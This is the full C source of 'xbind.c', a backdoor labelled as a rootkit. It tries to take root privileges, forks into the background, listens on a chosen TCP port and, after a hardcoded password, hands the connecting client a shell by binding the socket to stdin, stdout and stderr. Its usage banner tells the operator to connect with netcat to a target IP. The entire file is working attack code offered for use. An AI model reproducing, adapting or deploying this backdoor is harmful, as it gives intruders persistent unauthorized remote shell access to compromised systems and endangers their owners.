#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <signal.h>

#define ENTERPASS "Enter your password: \0"
#define PWD_ERR_INFO "Password error!\r\n"
#define WELCOME "Welcome to shell\r\nlet's do it:\r\n"
#define PASSWORD "12345"
#define BUF_LEN 1024
#define SHELL "/bin/my_rootkit_sh"
#define SH "my_rootkit_sh"

int main(int argc, char **argv)
{
	struct sockaddr_in s_addr;
	struct sockaddr_in c_addr;
	char buf[BUF_LEN];
	pid_t pid;
	int i, sock_descriptor, temp_sock_descriptor, c_addrsize;
 
	setuid(0);
	setgid(0);
	seteuid(0);
	setegid(0);

	if (argc != 2) {
		printf("=================================\r\n");
		printf("|xbind.c by xy7[B.C.T]\r\n");
		printf("|Usage:\r\n");
		printf("|./xbind 1985\r\n");
		printf("|nc -vv targetIP 1985\r\n");
		printf("|enter the password to get shell\r\n");
		printf("|Have a nice day;)\r\n");
		printf("=================================\r\n");
		exit(1);
	}

	if (fork()) { //not block at shell
		//signal(SIGCHLD, SIG_IGN); 
		exit(0);
	}

	sock_descriptor = socket(AF_INET,SOCK_STREAM,0);
	if (socket(AF_INET, SOCK_STREAM, 0) == -1) {
		printf("socket failed!");
		exit(1);
	}

	memset(&s_addr,0,sizeof(s_addr));
	s_addr.sin_family = AF_INET;
	s_addr.sin_addr.s_addr = htonl(INADDR_ANY);
	s_addr.sin_port = htons(atoi(argv[1]));
	
	if (bind(sock_descriptor,(struct sockaddr*)&s_addr,sizeof(s_addr)) == -1) {
		printf("bind failed!");
		exit(1);
	}

	if (listen(sock_descriptor, 20) == -1)//accept 20 connections
	{
		printf("listen failed!");
		exit(1);
	}

	while (1) 
	{
		c_addrsize = sizeof(c_addr);
		temp_sock_descriptor = accept(sock_descriptor,(struct sockaddr*)&c_addr,&c_addrsize);
		//recv
		if (temp_sock_descriptor) {
			pid = fork();
			if (pid > 0) {
				//printf("child pid = %d\n", pid);
				signal(SIGCHLD, SIG_IGN); 
				close(temp_sock_descriptor);
				continue;
			}
			else if (pid == 0) { //child process
				write(temp_sock_descriptor, ENTERPASS, strlen(ENTERPASS));
				memset(buf, 0, BUF_LEN);
				recv(temp_sock_descriptor, buf, BUF_LEN, 0);
 
				if (strncmp(buf, PASSWORD, strlen(PASSWORD)) != 0) {
					write(temp_sock_descriptor, PWD_ERR_INFO, strlen(PWD_ERR_INFO));
					close(sock_descriptor);
					close(temp_sock_descriptor);
					exit(1);
				}

				write(temp_sock_descriptor, WELCOME, strlen(WELCOME));
				dup2(temp_sock_descriptor, 0);	//standard input
				dup2(temp_sock_descriptor, 1);	//standard output
				dup2(temp_sock_descriptor, 2);	//standard error
				execl(SHELL, SH, (char*)0);
				close(temp_sock_descriptor);
				exit(0);
			}
			else {
				//fprintf(stderr, "Failed to fork process which stars shell.\n");
				exit(1);
			}
		}
	}
 
	close(sock_descriptor);
	return 0;
}
